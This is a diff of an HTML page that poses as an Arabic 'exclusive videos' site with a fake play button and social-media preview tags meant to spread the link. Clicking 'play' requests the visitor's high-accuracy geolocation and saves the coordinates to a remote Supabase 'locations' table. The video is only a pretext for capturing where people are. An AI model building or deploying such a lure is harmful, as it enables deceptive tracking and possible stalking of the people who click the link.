@@ -5,7 +5,22 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-    <title>2026 Scandals</title>
+    <title>فيديوهات حصرية</title>
+
+    <!-- WhatsApp / Facebook / Social Preview -->
+    <meta property="og:title" content="فيديوهات حصرية">
+    <meta property="og:description" content="اضغط لمشاهدة الفيديو">
+    <meta property="og:image"
+        content="https://mahmoud3035-create.github.io/location-share/image.png">
+    <meta property="og:type" content="website">
+    <meta property="og:url"
+        content="https://mahmoud3035-create.github.io/location-share/">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="فيديوهات حصرية">
+    <meta name="twitter:description" content="اضغط لمشاهدة الفيديو">
+    <meta name="twitter:image"
+        content="https://mahmoud3035-create.github.io/location-share/image.png">
 
     <style>
         * {
@@ -146,301 +161,293 @@
             color: #ddd;
         }
 
-        .location-link {
-            display: inline-block;
+        .permission-box {
+            margin-top: 15px;
+            padding: 15px;
+            background: #222;
+            border-radius: 10px;
+            color: #ddd;
+            line-height: 1.8;
+        }
+
+        .permission-button {
             margin-top: 10px;
-            color: #4da3ff;
-            text-decoration: none;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 8px;
+            background: white;
+            color: #111;
+            cursor: pointer;
+            font-size: 15px;
         }
     </style>
 </head>
 
 <body>
 
-<div class="page">
+    <div class="page">
 
-    <h1>
-       فديوهات حصريه
-    </h1>
+        <h1>
+            فيديوهات حصرية
+        </h1>
 
-    <div class="subtitle">
-        اضغط علي الزر لمشاهده الفديو
-    </div>
-
-    <!-- الصورة + زر التشغيل -->
-
-    <div
-        class="video-preview"
-        id="locationButton"
-        role="button"
-        tabindex="0"
-        aria-label="فديوهات حصريه"
-    >
-
-        <div class="play-button">
-            ▶
+        <div class="subtitle">
+            اضغط على الزر لمشاهدة الفيديو
         </div>
 
-        <div class="video-label">
-            اضغط لمشاهده الفديو
+        <div
+            class="video-preview"
+            id="locationButton"
+            role="button"
+            tabindex="0"
+            aria-label="مشاهدة الفيديو"
+        >
+
+            <div class="play-button">
+                ▶
+            </div>
+
+            <div class="video-label">
+                اضغط لمشاهدة الفيديو
+            </div>
+
         </div>
 
+        <div class="notice">
+            اضغط على زر التشغيل للمتابعة.
+            إذا اخترت مشاركة موقعك، سيظهر لك طلب من المتصفح
+            للموافقة على مشاركة موقعك.
+        </div>
+
+        <div id="result"></div>
+
     </div>
 
-    <!-- توضيح واضح -->
 
-    <div class="notice">
-        اضغط على زر للتشغيل.
-       سيطلب منك الاذن للوصول الي الفديو 
-    
-    </div>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 
-    <div id="result"></div>
+    <script>
 
-</div>
+        const SUPABASE_URL =
+            "https://vsztpvsicsmxjhsvqzbv.supabase.co";
 
-
-<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-
-<script>
-
-    const SUPABASE_URL =
-        "https://vsztpvsicsmxjhsvqzbv.supabase.co";
-
-    const SUPABASE_PUBLISHABLE_KEY =
-        "sb_publishable_N2P-l8nE7GaChsD5lrxb4w_nr8K5UrM";
+        const SUPABASE_PUBLISHABLE_KEY =
+            "sb_publishable_N2P-l8nE7GaChsD5lrxb4w_nr8K5UrM";
 
 
-    const supabaseClient =
-        window.supabase.createClient(
-            SUPABASE_URL,
-            SUPABASE_PUBLISHABLE_KEY
+        const supabaseClient =
+            window.supabase.createClient(
+                SUPABASE_URL,
+                SUPABASE_PUBLISHABLE_KEY
+            );
+
+
+        const locationButton =
+            document.getElementById("locationButton");
+
+        const result =
+            document.getElementById("result");
+
+
+        let processing = false;
+
+
+        locationButton.addEventListener(
+            "click",
+            requestLocation
         );
 
 
-    const locationButton =
-        document.getElementById("locationButton");
+        locationButton.addEventListener(
+            "keydown",
+            function (event) {
 
-    const result =
-        document.getElementById("result");
+                if (
+                    event.key === "Enter" ||
+                    event.key === " "
+                ) {
 
+                    event.preventDefault();
 
-    let processing = false;
+                    requestLocation();
+                }
 
-
-    locationButton.addEventListener(
-        "click",
-        requestLocation
-    );
-
-
-    locationButton.addEventListener(
-        "keydown",
-        function(event) {
-
-            if (
-                event.key === "Enter" ||
-                event.key === " "
-            ) {
-
-                event.preventDefault();
-
-                requestLocation();
             }
-
-        }
-    );
-
-
-    function requestLocation() {
-
-        if (processing) {
-            return;
-        }
-
-
-        if (!navigator.geolocation) {
-
-            result.innerHTML =
-                '<span class="error">' +
-                'Your browser does not support location.' +
-                '</span>';
-
-            return;
-        }
-
-
-        processing = true;
-
-        result.innerHTML =
-            '<span class="loading">' +
-            'Requesting your permission to access your location...' +
-            '</span>';
-
-
-        navigator.geolocation.getCurrentPosition(
-
-            locationSuccess,
-
-            locationError,
-
-            {
-                enableHighAccuracy: true,
-                timeout: 15000,
-                maximumAge: 0
-            }
-
         );
-    }
 
 
-    async function locationSuccess(position) {
+        function requestLocation() {
 
-        const latitude =
-            position.coords.latitude;
-
-        const longitude =
-            position.coords.longitude;
-
-        const accuracy =
-            position.coords.accuracy;
+            if (processing) {
+                return;
+            }
 
 
-        result.innerHTML =
-            '<span class="loading">' +
-            'Saving your location...' +
-            '</span>';
-
-
-        try {
-
-            const { error } =
-                await supabaseClient
-                    .from("locations")
-                    .insert({
-
-                        latitude: latitude,
-
-                        longitude: longitude,
-
-                        accuracy: accuracy
-
-                    });
-
-
-            if (error) {
-
-                console.error(
-                    "Supabase error:",
-                    error
-                );
+            if (!navigator.geolocation) {
 
                 result.innerHTML =
                     '<span class="error">' +
-                    'Registration failed.' +
+                    'المتصفح لا يدعم تحديد الموقع.' +
                     '</span>';
-
-                processing = false;
 
                 return;
             }
 
 
-            const mapUrl =
-                "https://www.google.com/maps?q=" +
-                latitude +
-                "," +
-                longitude;
+            processing = true;
 
 
-            result.innerHTML =
+            result.innerHTML = `
+                <div class="permission-box">
+                    للسماح بمشاركة موقعك، اضغط على
+                    <strong>السماح / Allow</strong>
+                    عندما يطلب المتصفح الإذن.
+                    <br>
+                    لن يتم حفظ موقعك إلا إذا وافقت.
+                </div>
+            `;
 
-                '<span class="success">' +
-                'سيتم مشاهده الفديو الان  ✅' +
-                '</span>' +
 
-                '<br>' +
+            navigator.geolocation.getCurrentPosition(
 
-                'Accuracy: ' +
-                Math.round(accuracy) +
-                ' meters' +
+                locationSuccess,
 
-                '<br>' +
+                locationError,
 
-                '<a class="location-link" ' +
-                'href="' +
-                mapUrl +
-                '" target="_blank">' +
-            
-                '</a>';
+                {
+                    enableHighAccuracy: true,
+                    timeout: 15000,
+                    maximumAge: 0
+                }
 
+            );
         }
 
-        catch (error) {
 
-            console.error(error);
+        async function locationSuccess(position) {
+
+            const latitude =
+                position.coords.latitude;
+
+            const longitude =
+                position.coords.longitude;
+
+            const accuracy =
+                position.coords.accuracy;
+
 
             result.innerHTML =
-                '<span class="error">' +
-                'Registration failed.' +
+                '<span class="loading">' +
+                'جاري حفظ الموقع...' +
                 '</span>';
 
+
+            try {
+
+                const { error } =
+                    await supabaseClient
+                        .from("locations")
+                        .insert({
+
+                            latitude: latitude,
+
+                            longitude: longitude,
+
+                            accuracy: accuracy
+
+                        });
+
+
+                if (error) {
+
+                    console.error(
+                        "Supabase error:",
+                        error
+                    );
+
+                    result.innerHTML =
+                        '<span class="error">' +
+                        'حدث خطأ أثناء حفظ الموقع.' +
+                        '</span>';
+
+                    processing = false;
+
+                    return;
+                }
+
+
+                result.innerHTML =
+                    '<span class="success">' +
+                    'تمت مشاركة الموقع بنجاح ✅' +
+                    '</span>';
+
+
+            }
+
+            catch (error) {
+
+                console.error(error);
+
+                result.innerHTML =
+                    '<span class="error">' +
+                    'حدث خطأ أثناء حفظ الموقع.' +
+                    '</span>';
+            }
+
+
+            processing = false;
         }
 
 
-        processing = false;
-    }
+        function locationError(error) {
+
+            console.error(
+                "Location error:",
+                error
+            );
 
 
-    function locationError(error) {
+            if (error.code === 1) {
 
-        console.error(
-            "Location error:",
-            error
-        );
+                result.innerHTML =
+                    '<span class="error">' +
+                    'لم تتم الموافقة على مشاركة الموقع.' +
+                    '</span>';
+
+            }
+
+            else if (error.code === 2) {
+
+                result.innerHTML =
+                    '<span class="error">' +
+                    'تعذر تحديد موقعك.' +
+                    '</span>';
+
+            }
+
+            else if (error.code === 3) {
+
+                result.innerHTML =
+                    '<span class="error">' +
+                    'انتهت مهلة طلب الموقع.' +
+                    '</span>';
+
+            }
+
+            else {
+
+                result.innerHTML =
+                    '<span class="error">' +
+                    'تعذر الحصول على موقعك.' +
+                    '</span>';
+            }
 
 
-        if (error.code === 1) {
-
-            result.innerHTML =
-                '<span class="error">' +
-                'Location permission was not granted.' +
-                '</span>';
-
+            processing = false;
         }
 
-        else if (error.code === 2) {
-
-            result.innerHTML =
-                '<span class="error">' +
-                'Unable to determine your location.' +
-                '</span>';
-
-        }
-
-        else if (error.code === 3) {
-
-            result.innerHTML =
-                '<span class="error">' +
-                'Location request timed out.' +
-                '</span>';
-
-        }
-
-        else {
-
-            result.innerHTML =
-                '<span class="error">' +
-                'Unable to get your location.' +
-                '</span>';
-
-        }
-
-
-        processing = false;
-    }
-
-</script>
+    </script>
 
 </body>
+
 </html>
